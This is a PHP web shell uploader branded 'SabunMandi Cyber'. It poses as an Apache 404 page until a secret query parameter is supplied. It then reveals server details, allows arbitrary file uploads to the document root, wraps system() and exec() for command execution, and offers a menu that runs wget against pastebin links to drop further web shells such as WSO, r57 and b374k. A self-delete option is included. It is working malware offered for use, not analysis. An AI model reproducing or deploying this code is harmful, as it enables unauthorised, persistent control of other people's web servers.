<?php
if(isset($_GET['sabunmandi'])){
?>
<html>
<head>
<title>Uploader By SabunMandi Cyber</title>    
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
background-color: black;
color: white;
    font-size: 13px;
}
a{
color:red;
text-decoration: none;
}
textarea{
backgroud-color:#333333;
color: white;
}
table, th, td {
    border-collapse:collapse;
    font-family: Tahoma, Geneva, sans-serif;
    background: transparent;
    font-family: 'Ubuntu';
    font-size: 13px;
}
select{
border: 1px white solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
input[type=submit] {
    background: transparent;
    color: #ffffff;
    height: 24px;
    border: 1px solid #ffffff;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Ubuntu';
    font-size: 13px;
}
</style>
</head>
<button id="Uwu" onclick="play();liat();">!Click here! </button><script type="text/javascript"></script><audio id="lagu" src="https://media1.vocaroo.com/mp3/10ISFuPWEocI"></audio></script> <style>body 
blockquote:after { content: "\2013 \2003" attr(cite); display: block; text-align: right; font-size: 0.875em; color: #000000;}</style><script>function play(){ var audio = document.getElementById("lagu"); audio.play();} function liat(){ document.getElementById('galiat').style.visibility="visible"; } </script>
</center>
<center>
<img src="https://i.ibb.co/mTkrqzx/d78a56abc0464e29e8500aa09d33388f.png" width="200px" height="200px"><br>

<font color='white' size="6">-=</font><font color='blue' size="8">Uploader SabunMandi</font><font color='white' size="6">=-</font><br>
<body bgcolor="black">
<?php
function w($dir,$perm) {
    if(!is_writable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=green>".$perm."</font>";
    }
}
function exe($cmd) {
    if(function_exists('system')) {         
        @ob_start();        
        @system($cmd);      
        $buff = @ob_get_contents();         
        @ob_end_clean();        
        return $buff;   
    } elseif(function_exists('exec')) {         
        @exec($cmd,$results);       
        $buff = "";         
        foreach($results as $result) {          
            $buff .= $result;       
        } return $buff;     
    } elseif(function_exists('passthru')) {         
        @ob_start();        
        @passthru($cmd);        
        $buff = @ob_get_contents();         
        @ob_end_clean();        
        return $buff;   
    } elseif(function_exists('shell_exec')) {       
        $buff = @shell_exec($cmd);      
        return $buff;   
    } 
}
function sulap($text) {
  if(!get_magic_quotes_gpc()) {
    return $text;
    }
  return stripslashes($text);
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING)); 
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
echo "<b><font color='green'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<b><font color='green'><br>".php_uname()."</b></font><br>";
echo "<b><font color='green'>Disable Functions: $show_ds</b></font><br><br>";
echo "&nbsp;<a href='?show' style='border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>H O M E</a>&nbsp;<a href='?c7e=kill' style='border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>K I L L </a>&nbsp;<a href='?bye=logout' style='color:red;border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>L O G O U T</a>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='file'>
<input type='submit' value='upload' name='upload'>
</form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "gagal upload di document root.";
        }
    } else {
        if(@copy($_FILES['file']['tmp_name'], $files)) {
            echo "sukses upload <b>$files</b> di folder ini";
        } else {
            echo "gagal upload";
        }
    }
}
    echo"<table align=center>";
    echo"<td>";
    echo"<form method='post'> ";  
    echo"<select name='shell' style=padding:5px 10px;>";  
    echo"<option selected'>        Shell Creator       </option>"; 
    echo"<option value='wso'>         WSO Shell       </option>";  
    echo"<option value='idx'>         IDX Shell       </option>"; 
    echo"<option value='r57'>         R57 Shell      </option>";  
    echo"<option value='b374k'>       B374K Shell       </option>";  
    echo"<option value='sadrazam'>         Sadrazam Shell       </option>"; 
    echo"<option value='blackhat'>         BlackHat Shell       </option>";
    echo"<option value='noname'>         Noname Shell       </option>";  
    echo "</select>";
    echo"&nbsp;<input type='submit' class='btn btn-success btn-sm' name='enter' value='Submit!'>";  
 if(isset($_POST['enter']))   {  
 if ($_POST['lucknut'] == 'wso_shell')  {  
 $exec=exec('wget http://pastebin.com/raw.php?i=Tpm5E10g -O wsoshell.php');
 if(file_exists('./wsoshell.php')){
 echo '<center><a href=./wsoshell.php target="_blank"> wso.php </a> upload sukses !</center>';
} else {
echo '<center>gagal upload !</center>';
}
}elseif($_POST['shell'] == 'idx') {
        $exec=exec('wget http://pastebin.com/raw.php?i=nC6pWh5a -O idx.php');
        if(file_exists('./idx.php')){
            echo '<center><a href=./idx.php target="_blank"> idx.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'r57') {
        $exec=exec('wget http://pastebin.com/raw.php?i=S9tzBgg3 -O r57.php');
        if(file_exists('./r57.php')){
            echo '<center><a href=./r57.php target="_blank"> r57.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'wso') {
        $exec=exec('wget http://pastebin.com/raw.php?i=N0eh3Q7Y -O wso.php');
        if(file_exists('./wsp.php')){
            echo '<center><a href=./wso.php target="_blank"> wso.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'b374k') {
        $exec=exec('wget http://pastebin.com/raw.php?i=cR71LiMp -O b374k.php');
        if(file_exists('./b374k.php')){
            echo '<center><a href=./b374k.php target="_blank"> b374k.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'sadrazam') {
        $exec=exec('wget http://pastebin.com/raw.php?i=xjKrnnBD -O sadrazam.php');
        if(file_exists('./sadrazam.php')){
            echo '<center><a href=./sadrazam.php target="_blank"> sadrazam.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'blackhat') {
        $exec=exec('wget http://pastebin.com/raw.php?i=3L2ESWeu -O bh.php');
        if(file_exists('./bh.php')){
            echo '<center><a href=./bh.php target="_blank"> bh.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }
}elseif($_POST['shell'] == 'noname') {
        $exec=exec('wget http://pastebin.com/raw.php?i=BRCmf02c -O noname.php');
        if(file_exists('./noname.php')){
            echo '<center><a href=./noname.php target="_blank"> noname.php </a> upload sukses !</center>';
        } else {
            echo '<center>Failed!</center>';
        }        
     }
}
}
elseif($_GET['bye'] == 'logout') {
    

echo '<form action="?dir=$dir&do=logout" method="post">';
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]); 
    echo 'Good Bye!!';
}
elseif($_GET['c7e'] == 'kill') {
    if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
            die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
        else
            echo '<center>unlink failed!</center>';
}
else{
echo "<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<HTML><HEAD>
<TITLE>404 Not Found</TITLE>
</HEAD><BODY>

<h1>Not Found</h1>

The requested URL ";
echo $_SERVER['REQUEST_URI'];
echo "
was not found on this server.
<hr>

";
echo "<address>Apache Server at ".$_SERVER['HTTP_HOST']." Port 80</address>";
}
?>
</center>
</html>
